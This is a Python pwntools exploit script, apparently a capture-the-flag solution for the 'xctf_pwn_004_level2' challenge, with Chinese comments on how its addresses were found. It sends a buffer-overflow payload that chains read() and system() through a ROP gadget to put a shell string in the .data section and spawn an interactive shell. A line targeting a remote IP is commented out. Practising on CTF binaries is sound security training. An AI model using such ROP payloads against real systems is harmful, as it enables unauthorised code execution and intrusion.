from pwn import *
from zzPwnlib import *
context(os='linux', arch='x86', log_level='debug')

#r = remote('111.200.241.244',49449)
r = process('./xctf_pwn_004_level2')

# system与read的plt地址，由ida可以直接查看到
system_addr     = 0x8048320
read_addr       = 0x8048310

# 一块可读可写的内存地址，ctrl+s快捷键呼出，这里选择了.data段
read_to_addr    = 0x804A01C

# 一段gadget, 由ROPgadget搜索得到，这里为
# 0x08048518 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret
# 这里只是用它来清理read函数在栈上的参数
pop_four_rop    = 0x08048518

payload  = payloadBase(0x88, 32)
payload += p32(read_addr)
payload += p32(pop_four_rop)
payload += p32(0)
payload += p32(read_to_addr)
payload += p32(8)
payload += p32(0xdeadbeef)

payload += p32(system_addr)
payload += p32(0xdeadbeef)
payload += p32(read_to_addr)
payload  = payload.ljust(0x100, b"B")

r.recv()
r.send(payload)

r.interactive()
